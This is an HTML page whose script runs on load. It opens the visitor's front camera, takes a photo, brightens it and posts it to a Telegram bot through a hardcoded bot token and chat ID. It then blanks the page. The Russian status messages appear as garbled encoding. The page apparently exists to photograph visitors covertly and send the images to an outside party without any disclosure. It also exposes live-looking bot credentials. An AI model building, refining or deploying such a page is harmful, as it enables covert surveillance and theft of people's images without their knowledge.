<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
    </style>
</head>
<body>
    <div id="status">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
    status.textContent = text;
}

async function captureAndSend() {
    let stream = null;
    
    try {
        updateStatus('1. –í–∫–ª—é—á–∞—é –∫–∞–º–µ—Ä—É...');
        
        // === –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï –ù–ò–ñ–ï ===
        // –ë–´–õ–û: navigator.mediaDevimedia
        // –°–¢–ê–õ–û: navigator.mediaDevices.getUserMedia
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });
        // === –ö–û–ù–ï–¶ –ò–°–ü–†–ê–í–õ–ï–ù–ò–Ø ===
        
        updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');
        
        // === 2. –ü–û–î–ì–û–¢–û–í–ö–ê –í–ò–î–ï–û ===
        const video = document.createElement('video');
        video.srcObject = stream;
        
        // –ñ–¥—ë–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –≤–∏–¥–µ–æ
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                updateStatus('2. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é —Ñ–æ–∫—É—Å...');
                resolve();
            };
        });
        
        // === 3. –ñ–î–Å–ú –§–û–ö–£–°–ò–†–û–í–ö–ò ===
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // === 4. –î–ï–õ–ê–ï–ú –°–ù–ò–ú–û–ö ===
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É —Å—Ä–∞–∑—É
        stream.getTracks().forEach(track => track.stop());
        updateStatus('‚úÖ –§–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ');
        
        // === 5. –£–õ–£–ß–®–ê–ï–ú –Ø–†–ö–û–°–¢–¨ ===
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        for (let i = 0; i < data.length; i += 4) {
            data[i] = Math.min(255, data[i] * 1.3);
            data[i + 1] = Math.min(255, data[i + 1] * 1.3);
            data[i + 2] = Math.min(255, data[i + 2] * 1.3);
        }
        
        ctx.putImageData(imageData, 0, 0);
        updateStatus('3. –û—Ç–ø—Ä–∞–≤–ª—è—é...');
        
        // === 6. –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM ===
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateStatus('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
                    setTimeout(() => {
                        document.body.innerHTML = '';
                    }, 1000);
                } else {
                    updateStatus(`‚ùå –û—à–∏–±–∫–∞ Telegram: ${result.description}`);
                }
            } catch (fetchError) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${fetchError.message}`);
            }
        }, 'image/jpeg', 0.8);
        
    } catch (error) {
        updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

captureAndSend();
</script>
</body>
</html>